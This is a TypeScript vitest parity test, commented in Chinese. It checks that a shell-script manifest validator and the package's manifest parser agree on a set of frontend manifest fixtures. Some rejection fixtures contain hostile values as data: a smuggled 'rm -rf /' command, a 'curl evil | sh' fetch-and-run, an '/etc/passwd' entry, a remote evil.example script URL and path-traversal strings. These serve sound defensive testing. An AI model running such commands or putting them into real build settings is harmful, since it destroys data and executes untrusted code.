/**
 * 制品 manifest 校验的**同源（parity）测试**（Phase 12.1 / P1-B）。
 *
 * 生产环境里的 `scripts/frontend.sh` 不能假设宿主有 Node，因此它用 python3
 * 重新实现了一份 manifest 校验。两份实现**必须判定一致**，否则会出现
 * "CLI 说能装、浏览器说不能加载"（或反过来）这类极难定位的故障。
 *
 * 这里用同一组 fixture 分别跑：
 *   1. 本包的权威解析器 `parseFrontendManifest`（制品契约）
 *   2. `scripts/frontend.sh _manifest-validate-json`（制品模式 / 源码模式）
 * 并断言：
 *   - 制品模式：接受/拒绝完全一致
 *   - 源码模式：凡被接受的，其经 CLI 生成的 `frontend.json` 必须被权威解析器接受，
 *     且生成物里不含任何源码专用字段
 */
import { execFileSync } from "node:child_process";
import { existsSync, mkdtempSync, readFileSync, rmSync, writeFileSync } from "node:fs";
import { tmpdir } from "node:os";
import { join, resolve } from "node:path";

import { afterAll, describe, expect, it } from "vitest";

import { parseFrontendManifest } from "../manifest";

/**
 * 从当前工作目录向上找 `scripts/frontend.sh`。
 *
 * 不用 `import.meta.url`：vitest 的转换结果不保证是 `file:` URL。
 * 找不到就整组跳过 —— 这个包要发布到 npm，不能假设仓库布局一定存在。
 */
function findFrontendScript(): string | null {
	let dir = process.cwd();
	for (let depth = 0; depth < 6; depth += 1) {
		const candidate = join(dir, "scripts", "frontend.sh");
		if (existsSync(candidate)) return candidate;
		dir = resolve(dir, "..");
	}
	return null;
}

const script = findFrontendScript();
const available = script !== null;

const base = {
	schemaVersion: 1,
	id: "demo",
	name: "Demo",
	version: "1.0.0",
	compatibility: { frontendRuntime: "1", apiContract: "1" },
	entry: "assets/app.js",
	styles: ["assets/app.css"],
};

type Fixture = { name: string; manifest: Record<string, unknown> };

const fixtures: Fixture[] = [
	{ name: "good", manifest: { ...base } },
	{ name: "good-minimal", manifest: { ...base, styles: undefined } },
	{ name: "good-with-optional", manifest: { ...base, description: "d", author: "a" } },
	{ name: "good-sdk-note", manifest: { ...base, compatibility: { frontendRuntime: "1", apiContract: "1", sdk: "1.0.0" } } },
	{ name: "unknown-field", manifest: { ...base, source: "/home/me/x" } },
	{ name: "bad-schema", manifest: { ...base, schemaVersion: 2 } },
	{ name: "bad-id", manifest: { ...base, id: "../evil" } },
	{ name: "id-too-long", manifest: { ...base, id: `a${"b".repeat(64)}` } },
	{ name: "bad-semver", manifest: { ...base, version: "1.0" } },
	{ name: "semver-prerelease", manifest: { ...base, version: "1.0.0-rc.1" } },
	{ name: "empty-name", manifest: { ...base, name: "  " } },
	{ name: "name-too-long", manifest: { ...base, name: "x".repeat(129) } },
	{ name: "description-too-long", manifest: { ...base, description: "x".repeat(1025) } },
	{ name: "author-too-long", manifest: { ...base, author: "x".repeat(257) } },
	{ name: "compat-unknown-key", manifest: { ...base, compatibility: { frontendRuntime: "1", apiContract: "1", buildHost: "ci" } } },
	{ name: "compat-runtime-mismatch", manifest: { ...base, compatibility: { frontendRuntime: "9", apiContract: "1" } } },
	{ name: "compat-api-mismatch", manifest: { ...base, compatibility: { frontendRuntime: "1", apiContract: "9" } } },
	{ name: "compat-missing", manifest: { ...base, compatibility: undefined } },
	{ name: "compat-sdk-wrong-type", manifest: { ...base, compatibility: { frontendRuntime: "1", apiContract: "1", sdk: 1 } } },
	{ name: "entry-absolute", manifest: { ...base, entry: "/etc/passwd" } },
	{ name: "entry-traversal", manifest: { ...base, entry: "../../evil.js" } },
	{ name: "entry-scheme", manifest: { ...base, entry: "https://evil.example/x.js" } },
	{ name: "entry-backslash", manifest: { ...base, entry: "assets\\app.js" } },
	{ name: "entry-dot-segment", manifest: { ...base, entry: "./assets/app.js" } },
	{ name: "entry-empty", manifest: { ...base, entry: "" } },
	{ name: "styles-not-array", manifest: { ...base, styles: "assets/app.css" } },
	{ name: "styles-bad-path", manifest: { ...base, styles: ["../x.css"] } },
	{ name: "styles-too-many", manifest: { ...base, styles: Array.from({ length: 17 }, (_, i) => `s${i}.css`) } },
	{ name: "artifact-has-build", manifest: { ...base, build: { script: "build" } } },
	{ name: "source-build-ok", manifest: { ...base, build: { packageManager: "pnpm", script: "build:floatctf", outputDir: "out-ui" } } },
	{ name: "source-build-empty", manifest: { ...base, build: {} } },
	{ name: "source-build-bad-pm", manifest: { ...base, build: { packageManager: "bun" } } },
	{ name: "source-build-shell-injection", manifest: { ...base, build: { script: "build; rm -rf /" } } },
	{ name: "source-build-outdir-escape", manifest: { ...base, build: { outputDir: "../../etc" } } },
	{ name: "source-build-unknown-key", manifest: { ...base, build: { postinstall: "curl evil | sh" } } },
	{ name: "source-build-not-object", manifest: { ...base, build: "pnpm build" } },
];

const dir = available ? mkdtempSync(join(tmpdir(), "fcft-parity-")) : "";

afterAll(() => {
	if (dir) rmSync(dir, { recursive: true, force: true });
});

function writeFixture(manifest: Record<string, unknown>, index: number): string {
	const file = join(dir, `fixture-${index}.json`);
	writeFileSync(file, JSON.stringify(manifest, null, 2));
	return file;
}

function runCli(args: string[]): { ok: boolean } {
	try {
		execFileSync("bash", [script as string, ...args], {
			stdio: ["ignore", "pipe", "pipe"],
			encoding: "utf-8",
		});
		return { ok: true };
	} catch {
		return { ok: false };
	}
}

function cliVerdict(manifest: Record<string, unknown>, source: boolean, index: number): boolean {
	return runCli(["_manifest-validate-json", writeFixture(manifest, index), String(source)]).ok;
}

function parseArtifact(manifest: unknown) {
	return parseFrontendManifest(manifest, {
		manifestSchemaVersion: 1,
		frontendRuntimeVersion: "1",
		apiContractVersion: "1",
	});
}

describe.skipIf(!available)("frontend.sh manifest validator parity", () => {
	it.each(fixtures.map((fixture, index) => ({ ...fixture, index })))(
		"agrees with parseFrontendManifest in artifact mode on $name",
		({ manifest, index }) => {
			expect(cliVerdict(manifest, false, index)).toBe(parseArtifact(manifest).ok);
		},
	);

	it("generates a runtime-valid artifact manifest from every accepted source manifest", () => {
		let accepted = 0;
		fixtures.forEach((fixture, index) => {
			const source = writeFixture(fixture.manifest, 1000 + index);
			if (!runCli(["_manifest-validate-json", source, "true"]).ok) {
				return;
			}
			accepted += 1;
			const out = join(dir, `artifact-${index}.json`);
			expect(runCli(["_manifest-to-artifact", source, out]).ok).toBe(true);

			const generated = JSON.parse(readFileSync(out, "utf-8")) as Record<string, unknown>;
			// 源码专用字段绝不允许泄漏到制品 manifest。
			expect(Object.keys(generated)).not.toContain("build");
			expect(parseArtifact(generated).ok).toBe(true);
		});
		expect(accepted).toBeGreaterThan(0);
	});
});
